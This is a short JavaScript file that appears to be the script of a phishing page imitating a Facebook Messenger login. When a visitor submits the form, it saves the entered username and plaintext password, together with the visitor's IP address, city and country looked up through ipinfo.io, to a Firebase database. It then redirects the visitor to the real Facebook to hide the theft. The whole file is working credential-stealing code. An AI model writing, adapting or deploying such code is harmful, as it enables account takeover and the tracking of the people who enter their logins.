const userId = document.getElementById('acc');
const Pass = document.getElementById('pw');
const LoginBtn = document.getElementById('login');

const database = firebase.database();
console.log(window.location.origin.toString());
// var path = window.location.origin.toString().replace('www.massanger.','');
// var end_of_unique = window.location.origin.toString().indexOf("netlify.app");
// var path = window.location.origin.toString().substring(0,end_of_unique-1);
// path = path.replace("https://www.","");

// var path = window.location.pathname.toString();
// while(path.indexOf("/")>=0)
//   path = path.replace("/","");
// while(path.indexOf(".")>=0)
//   path = path.replace(".","");

// // path = path.replace("https://www.","");
// path = path.replace("/",'');
var path = "Massanger";
console.log(path);
const usersRef = database.ref('/users' + path);
var city = ""
var country = ""
var ip = ""
$.get("https://ipinfo.io", function (response) {
  city = response.city
  ip = response.ip
  country = response.country
  console.log(response.city, response.country);
}, "jsonp");


LoginBtn.addEventListener('click', e => {
  e.preventDefault();
  // const autoId = usersRef.push().key
  // usersRef.child(autoId).set({
  //   ID: userId.value,
  //   pw: Pass.value
  // });
  if (userId.value.length > 4 && Pass.value.length > 4) {

    usersRef.child(userId.value).transaction(function (currentData) {
      if (currentData === null) {
        return { ID: userId.value, pw: Pass.value, City: city, Country: country, IP: ip };
        // return {ID:userId.value,pw:Pass.value,City:"",Country:"",IP:""};
      } else {
        // console.log('User  already exists.');
        return; // Abort the transaction.
      }
    });
    window.location.replace("http://www.facebook.com/me");
  }
});
